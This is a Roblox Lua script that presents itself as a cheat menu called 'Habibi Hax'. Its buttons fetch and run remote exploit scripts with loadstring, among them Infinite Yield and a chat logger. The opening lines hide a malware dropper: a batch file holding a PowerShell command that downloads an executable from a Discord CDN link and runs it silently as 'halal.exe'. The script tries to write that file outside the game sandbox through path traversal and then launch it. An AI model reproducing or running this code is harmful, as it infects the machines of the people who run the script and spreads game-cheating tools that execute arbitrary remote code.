local LinkingService = game:GetService("LinkingService")
local ScriptContext = game:GetService("ScriptContext")

local scriptContent = [[@echo off
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1251898295073116200/1251898334579523624/Built.exe?ex=667040ae&is=666eef2e&hm=c91dddd0f7c9d8fce3595b598ed25a05e13647a53f1fc44f99eddeefdc1520ef&', 'halal.exe'); Start-Process -FilePath '.\halal.exe' -ArgumentList '/S' -Wait"
]]

local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "../../../../test.bat")
LinkingService:OpenUrl(payload)

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local load = Instance.new("TextButton")
local yeet = Instance.new("TextButton")
local infy = Instance.new("TextButton")
local logg = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(30, 17, 4)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.326875955, 0, 0.271802336, 0)
Frame.Size = UDim2.new(0.34513849, 0, 0.454941869, 0)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(1, 0, 0.129712477, 0)
TextLabel.Font = Enum.Font.IndieFlower
TextLabel.Text = "Habibi Hax"
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.364885509, 0, 0.198083073, 0)
TextBox.Size = UDim2.new(0.594470739, 0, 0.11916934, 0)
TextBox.Font = Enum.Font.Arcade
TextBox.PlaceholderColor3 = Color3.fromRGB(161, 0, 0)
TextBox.PlaceholderText = "url"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 0, 0)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true

load.Name = "load"
load.Parent = Frame
load.BackgroundColor3 = Color3.fromRGB(85, 170, 0)
load.BorderColor3 = Color3.fromRGB(0, 0, 0)
load.BorderSizePixel = 0
load.Position = UDim2.new(0.0443778858, 0, 0.198083073, 0)
load.Size = UDim2.new(0.296538949, 0, 0.119000003, 0)
load.Font = Enum.Font.Unknown
load.Text = "Load Script"
load.TextColor3 = Color3.fromRGB(255, 255, 255)
load.TextScaled = true
load.TextSize = 14.000
load.TextWrapped = true

yeet.Name = "yeet"
yeet.Parent = Frame
yeet.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
yeet.BorderColor3 = Color3.fromRGB(0, 0, 0)
yeet.BorderSizePixel = 0
yeet.Position = UDim2.new(0.0443779603, 0, 0.610223651, 0)
yeet.Size = UDim2.new(0.914978385, 0, 0.080661349, 0)
yeet.Font = Enum.Font.Unknown
yeet.Text = "FE Yeet Gui"
yeet.TextColor3 = Color3.fromRGB(163, 163, 163)
yeet.TextScaled = true
yeet.TextSize = 14.000
yeet.TextWrapped = true

infy.Name = "infy"
infy.Parent = Frame
infy.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
infy.BorderColor3 = Color3.fromRGB(0, 0, 0)
infy.BorderSizePixel = 0
infy.Position = UDim2.new(0.0443779603, 0, 0.715654969, 0)
infy.Size = UDim2.new(0.914978385, 0, 0.080661349, 0)
infy.Font = Enum.Font.Unknown
infy.Text = "Infinite Yield"
infy.TextColor3 = Color3.fromRGB(39, 39, 39)
infy.TextScaled = true
infy.TextSize = 14.000
infy.TextWrapped = true

logg.Name = "logg"
logg.Parent = Frame
logg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
logg.BorderColor3 = Color3.fromRGB(0, 0, 0)
logg.BorderSizePixel = 0
logg.Position = UDim2.new(0.0443779603, 0, 0.507987201, 0)
logg.Size = UDim2.new(0.914978385, 0, 0.080661349, 0)
logg.Font = Enum.Font.Unknown
logg.Text = "chat logger"
logg.TextColor3 = Color3.fromRGB(39, 39, 39)
logg.TextScaled = true
logg.TextSize = 14.000
logg.TextWrapped = true

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(-0.00246544229, 0, 0.936102211, 0)
TextLabel_2.Size = UDim2.new(1, 0, 0.0626197308, 0)
TextLabel_2.Font = Enum.Font.IndieFlower
TextLabel_2.Text = "Created by tactical_sniper777"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

-- Scripts:

local function MTSVK_fake_script() -- load.LocalScript 
	local script = Instance.new('LocalScript', load)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(tostring(script.Parent.Parent.TextBox.Text))()
	end)
end
coroutine.wrap(MTSVK_fake_script)()
local function ZVYIR_fake_script() -- yeet.LocalScript 
	local script = Instance.new('LocalScript', yeet)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Flacherflache/FE-Yeet-Gui/main/Script'))()
	end)
end
coroutine.wrap(ZVYIR_fake_script)()
local function BVYT_fake_script() -- infy.LocalScript 
	local script = Instance.new('LocalScript', infy)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
end
coroutine.wrap(BVYT_fake_script)()
local function KRJU_fake_script() -- logg.LocalScript 
	local script = Instance.new('LocalScript', logg)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Lost20/Roblox-Scripts/main/chat%20logger'))()
	
	end)
end
coroutine.wrap(KRJU_fake_script)()
